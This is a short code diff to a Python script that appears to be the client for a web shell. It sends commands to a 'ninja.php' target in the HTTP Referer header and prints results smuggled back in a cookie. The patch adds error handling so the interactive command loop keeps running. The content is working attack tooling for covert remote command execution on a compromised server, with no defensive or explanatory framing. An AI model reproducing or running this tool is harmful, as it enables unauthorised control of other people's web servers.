@@ -42,10 +42,14 @@ def main():
         main()
     elif not cmd:
         main()
-    else :
-        r=requests.get(target, headers={"Referer":cmd})
-        print(unquote(r.cookies['x'].replace('+',' ')))
-        main()
+    else:
+        try:
+            r=requests.get(target, headers={"Referer":cmd})
+            print(unquote(r.cookies['x'].replace('+',' ')))
+            main()
+        except:
+            print(' ')
+            main()
 
 
 target = input("Target site (http://xxxxx.com/ninja.php) > ")
